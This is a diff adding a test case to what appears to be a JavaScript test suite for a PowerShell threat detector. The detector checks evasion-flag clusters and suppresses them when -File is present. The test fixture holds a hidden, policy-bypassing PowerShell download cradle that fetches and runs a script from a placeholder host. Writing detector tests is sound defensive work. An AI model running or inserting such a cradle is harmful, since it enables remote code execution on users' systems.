@@ -34,6 +34,15 @@ describe('evasion-flag clustering', () => {
     const raw = "powershell -nop -w hidden -ExecutionPolicy Bypass -File C:\\ops\\backup.ps1"
     expect(ids('Get-ChildItem', raw)).not.toContain('evasion-cluster')
   })
+
+  it('the -File discriminator is load-bearing: the same cluster+payload fires, and a -File in the corpus suppresses it', () => {
+    const raw = 'powershell -nop -w hidden -ep bypass' // 3-flag cluster, no -File
+    const payload = "IEX (New-Object Net.WebClient).DownloadString('http://x.test/a')"
+    // cluster>=3 AND payload (fetch+IEX sink) AND no -File -> fires
+    expect(ids(payload, raw)).toContain('evasion-cluster')
+    // same cluster+payload, but a -File mention in the corpus -> localFile suppresses it
+    expect(ids('-File C:\\ops\\job.ps1 ; ' + payload, raw)).not.toContain('evasion-cluster')
+  })
 })
 
 describe('co-occurrence upgrade', () => {
